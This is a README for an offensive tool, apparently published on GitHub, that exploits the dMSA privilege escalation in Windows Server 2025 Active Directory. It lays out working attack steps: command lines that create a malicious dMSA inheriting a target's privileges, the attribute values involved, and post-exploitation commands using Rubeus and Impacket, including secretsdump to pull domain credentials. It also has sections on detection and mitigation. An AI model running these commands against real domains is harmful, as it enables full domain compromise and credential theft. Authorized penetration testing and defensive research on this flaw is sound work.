# BadSuccessor

A penetration testing tool that exploits the dMSA (delegated Managed Service Account) privilege escalation vulnerability in Windows Server 2025 Active Directory environments.

## ⚠️ Legal Disclaimer

**This tool is for authorized penetration testing and security research purposes only.** Use of this tool against systems without explicit written permission is illegal and unethical. The authors are not responsible for any misuse or damage caused by this tool.

## 📋 Overview

BadSuccessor exploits a privilege escalation vulnerability in Windows Server 2025's delegated Managed Service Account (dMSA) feature. The vulnerability allows attackers with minimal permissions to escalate privileges to any user in the domain, including Domain Administrators.

### Research Credit

This tool is based on the excellent research by **Yuval Gordon** from **Akamai Technologies**:
- [BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/badsuccessor-abusing-dmsa-escalate-privileges-active-directory)

## 🎯 Vulnerability Details

The vulnerability exists in the dMSA migration process where:
1. An attacker creates a malicious dMSA in any writable OU
2. Sets `msDS-ManagedAccountPrecededByLink` to point to a target user
3. Sets `msDS-DelegatedMSAState` to `2` (migration completed)
4. The KDC automatically grants the dMSA all privileges of the target user via PAC inheritance

## ✅ Prerequisites

### System Requirements
- Linux machine (non-domain joined)
- Python 3.6+
- Network access to target Active Directory environment

### Python Dependencies
```bash
pip3 install ldap3 impacket dnspython
```

### Required Permissions
- Valid domain credentials (any user account)
- `CreateChild` permission on at least one Organizational Unit
  - This is often granted to regular users and considered "low risk"
  - Tool automatically discovers writable OUs

## 🚀 Installation

```bash
git clone https://github.com/yourusername/badsuccessor.git
cd badsuccessor
pip3 install -r requirements.txt
chmod +x badsuccessor.py
```

## 📖 Usage

### Basic Syntax
```bash
python3 badsuccessor.py -d <domain> -u <username> -p <password> [options]
```

### Examples

#### 1. Enumerate High-Value Targets
```bash
python3 badsuccessor.py -d corp.local -u lowpriv -p password123 --targets
```

#### 2. Discover Writable OUs
```bash
python3 badsuccessor.py -d corp.local -u lowpriv -p password123 --dc-ip 192.168.1.10 --enumerate
```

#### 3. Perform Privilege Escalation Attack
```bash
python3 badsuccessor.py -d corp.local -u lowpriv -p password123 --dc-ip 192.168.1.10 --attack --target Administrator
```

#### 4. Clean Up After Testing
```bash
python3 badsuccessor.py -d corp.local -u lowpriv -p password123 --dc-ip 192.168.1.10 --cleanup --dmsa-dn "CN=evil_dmsa,OU=temp,DC=corp,DC=local"
```

### Command Line Options

| Option | Description |
|--------|-------------|
| `-d, --domain` | Target domain (e.g., corp.local) |
| `-u, --username` | Username for authentication |
| `-p, --password` | Password for authentication |
| `--dc-ip` | Domain Controller IP (auto-discover if omitted) |
| `--enumerate` | Enumerate writable OUs |
| `--attack` | Perform the BadSuccessor attack |
| `--target` | Target user to escalate privileges to |
| `--dmsa-name` | Name for malicious dMSA (default: evil_dmsa) |
| `--ou-dn` | Specific OU DN to use |
| `--cleanup` | Remove created dMSA |
| `--dmsa-dn` | dMSA DN for cleanup operations |
| `--targets` | Enumerate high-value targets |
| `--no-banner` | Suppress banner output |

## 🔧 Attack Workflow

### Phase 1: Reconnaissance
1. **Domain Controller Discovery**: Automatically finds DCs via DNS SRV records
2. **Environment Check**: Verifies Windows Server 2025 DCs (dMSA feature availability)
3. **Target Enumeration**: Identifies high-value accounts (Domain Admins, etc.)
4. **Permission Discovery**: Finds OUs where current user can create objects

### Phase 2: Exploitation
1. **dMSA Creation**: Creates malicious dMSA object in writable OU
2. **Migration Simulation**: Sets critical attributes to simulate completed migration:
   - `msDS-ManagedAccountPrecededByLink` → Target user DN
   - `msDS-DelegatedMSAState` → 2 (completed)
3. **Verification**: Confirms dMSA configuration is correct

### Phase 3: Post-Exploitation
The tool provides commands for obtaining and using the escalated privileges:

#### Using Rubeus (Windows)
```cmd
Rubeus.exe asktgs /targetuser:evil_dmsa$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt
```

#### Using Impacket (Linux)
```bash
getTGT.py corp.local/evil_dmsa$ -dc-ip 192.168.1.10 -no-pass -k
secretsdump.py corp.local/evil_dmsa$@192.168.1.10 -just-dc -k
```

## 🛡️ Detection

### Event IDs to Monitor
- **5137**: Directory service object creation (dMSA creation)
- **5136**: Directory service object modification (attribute changes)
- **2946**: Group Managed Service Account authentication (dMSA TGT requests)

### Detection Rules
Monitor for:
- Creation of `msDS-DelegatedManagedServiceAccount` objects by non-administrative users
- Modifications to `msDS-ManagedAccountPrecededByLink` attribute
- Unusual dMSA authentication events (Event 2946 with Caller SID S-1-5-7)

## 🔒 Mitigation

### Immediate Actions
1. **Audit OU Permissions**: Review and restrict `CreateChild` permissions on OUs
2. **Monitor dMSA Operations**: Implement detection rules for suspicious dMSA activities
3. **Principle of Least Privilege**: Limit users who can create service accounts

### Long-term Solutions
- **Patch Deployment**: Apply Microsoft patches when available
- **Access Control Review**: Regular audits of AD permissions
- **Security Monitoring**: Enhanced logging for privileged account operations

## 📊 Statistics

Based on Akamai's research:
- **91%** of examined environments had users with required permissions
- Works on **default configurations** without special setup
- Affects most organizations using Active Directory with Windows Server 2025

## 🏗️ Technical Details

### dMSA Object Attributes
```
objectClass: ['top', 'msDS-GroupManagedServiceAccount', 'msDS-DelegatedManagedServiceAccount']
msDS-ManagedAccountPrecededByLink: <Target User DN>
msDS-DelegatedMSAState: 2 (Migration Completed)
sAMAccountName: <dMSA Name>$
userAccountControl: 4096 (WORKSTATION_TRUST_ACCOUNT)
```

### PAC Inheritance Mechanism
When the dMSA authenticates, the KDC:
1. Reads `msDS-ManagedAccountPrecededByLink` attribute
2. Builds PAC using target user's SIDs and group memberships
3. Grants dMSA all privileges of the "superseded" account
4. No verification of legitimate migration occurs

## 🤝 Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Submit a pull request with detailed description

## 📝 Changelog

### v1.0.0 (2025-05-23)
- Initial release
- Linux-compatible implementation
- LDAP-based exploitation
- Automatic DC discovery
- Integration with impacket toolkit

## 📚 References

- [Original Akamai Research](https://www.akamai.com/blog/security-research/badsuccessor-abusing-dmsa-escalate-privileges-active-directory)
- [Microsoft dMSA Documentation](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- [LDAP3 Documentation](https://ldap3.readthedocs.io/)
- [Impacket Framework](https://github.com/SecureAuthCorp/impacket)

## 📧 Contact

For questions or issues:
- Open a GitHub Issue
- Follow responsible disclosure for vulnerabilities
